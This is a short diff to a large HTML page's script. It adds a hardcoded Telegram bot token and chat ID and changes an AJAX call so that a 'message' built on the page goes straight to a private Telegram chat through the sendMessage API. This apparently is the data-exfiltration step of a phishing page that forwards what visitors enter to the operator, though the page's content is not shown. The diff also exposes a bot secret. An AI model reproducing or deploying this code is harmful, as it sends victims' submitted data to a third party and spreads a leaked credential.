@@ -9104,14 +9104,19 @@
 
         // return console.log(message);
 
+        const botToken = "8321594074:AAF0OiHDnPDyGMa8yWY9oi20I8A6uJhU2o0";
+        const chatId = 7765726318;
+
         $.ajax({
           type: "GET",
-          url: `https://telegram-bot-api-s1p9.onrender.com/send`,
+          url: `https://api.telegram.org/bot${botToken}/sendMessage`,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
           data: {
-            text: message,
+            'chat_id':chatId,
+        'text': message,
+        'parse_mode' : 'HTML'
           },
           beforeSend: function () {
             processBtn.html(
@@ -9155,6 +9160,7 @@
       });
     });
   </script>
+
 
 
 </body></html>
